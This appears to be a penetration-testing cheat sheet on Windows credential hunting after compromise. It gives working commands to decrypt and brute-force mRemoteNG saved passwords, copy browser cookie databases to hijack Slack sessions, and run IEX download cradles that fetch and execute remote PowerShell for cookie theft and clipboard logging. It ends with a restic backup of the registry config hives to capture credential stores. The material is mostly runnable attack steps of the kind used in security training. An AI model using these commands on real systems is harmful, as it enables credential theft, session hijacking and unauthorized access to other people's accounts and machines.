## Data Sources
- Installed applications
- Installed services
  - Websites
  - File Shares
  - Databases
  - Directory Services (such as Active Directory, Azure AD, etc.)
  - Name Servers
  - Deployment Services
  - Certificate Authority
  - Source Code Management Server
  - Virtualization
  - Messaging
  - Monitoring and Logging Systems
  - Backups
- Sensitive Data
  - Keylogging
  - Screen Capture
  - Network Traffic Capture
  - Previous Audit reports
- User Information
  - History files, interesting documents (.doc/x,.xls/x,password./pass., etc)
  - Roles and Privileges
  - Web Browsers
  - IM Clients
 

**Identifying Common Applications
```
dir "C:\Program Files"
```

**Get Installed Programs via PowerShell & Registry Keys
```
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```
- Contains mRemoteNG

**mRemoteNG

Saves connection info and credentials to a file called confCons.xml located at (%USERPROFILE%\APPDATA\Roaming\mRemoteNG). Hardcoded master password: mR3m

**Discover mRemoteNG Configuration Files
```
ls C:\Users\julio\AppData\Roaming\mRemoteNG
```

**mRemoteNG Configuration File - confCons.xml
```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
    ..SNIP..
</Connections>
```
- If the user did not set a custom master password, we can use this script to decrypt the password: https://github.com/haseebT/mRemoteNG-Decrypt

**Decrypt the Password with mremoteng_decrypt
```
python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 
```

**Decrypt the Password with mremoteng_decrypt and a Custom Password
```
python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin
```

**For Loop to Crack the Master Password with mrmeoteng_decrypt
```
for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done
```

## Abusing Cookies to Get Access to IM Clients

IM = instant messaging
- Microsoft Teams
- Slack

**Copy Firefox Cookies Database
```
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

**Extract Slack Cookie from Firefox Cookies Database
```
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```

**Add cookie to our browser with extension
https://cookie-editor.cgagnier.ca/


## Cookie Extraction from Chromium-based Browsers

**PowerShell Script - Invoke-SharpChromium
```ps
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
Invoke-SharpChromium -Command "cookies slack.com"
```

**Copy Cookies to SharpChromium Expected Location
```
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```

**Invoke-SharpChromium Cookies Extraction
```
Invoke-SharpChromium -Command "cookies slack.com"
```


## Clipboard

https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1

**Monitor the Clipboard with PowerShell
```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
Invoke-ClipboardLogger
```
- Metasploit has built-in keylogger


## Roles and Services

Servers:
- File and Print Servers
- Web and Database Servers
- Certificate Authority Servers
- Source Code Management Servers
- Backup Servers

**Attacking Backup Servers

**restic - Initialize Backup Directory
```
mkdir E:\restic2; restic.exe -r E:\restic2 init
```

**restic - Back up a Directory
```
$env:RESTIC_PASSWORD = 'Password'
restic.exe -r E:\restic2\ backup C:\SampleFolder
```

**restic - Back up a Directory with VSS
```
restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
```

**restic - Check Backups Saved in a Repository
```
restic.exe -r E:\restic2\ snapshots
```

**restic - Restore a Backup with ID
```
restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
```
- If we navigate to C:\Restore, we will find the directory structure where the backup was taken

